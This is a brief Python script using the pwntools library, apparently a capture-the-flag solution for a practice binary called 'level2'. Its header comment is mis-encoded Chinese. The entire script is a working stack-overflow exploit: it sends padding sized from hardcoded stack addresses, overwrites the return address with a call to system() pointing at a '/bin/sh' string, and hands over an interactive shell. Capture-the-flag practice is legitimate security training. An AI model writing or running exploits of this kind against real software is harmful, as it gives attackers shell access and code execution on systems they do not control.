# coding:UTF-8
# author:iopr
# ¼òµ¥Õ»Òç³ö

from pwn import *
context(os='linux',arch='i386')

Debug=1
if Debug:
    io=process('./level2')
else:
    pass

buf=0xBFB73B20
ret=0xBFB73BAC
func_system=0x08048320
string_binsh=0x0804A024

def main():
    io.recv()
    io.sendline((ret-buf)*'a'+p32(func_system)+p32(0x0)+p32(string_binsh))
    io.interactive()

main()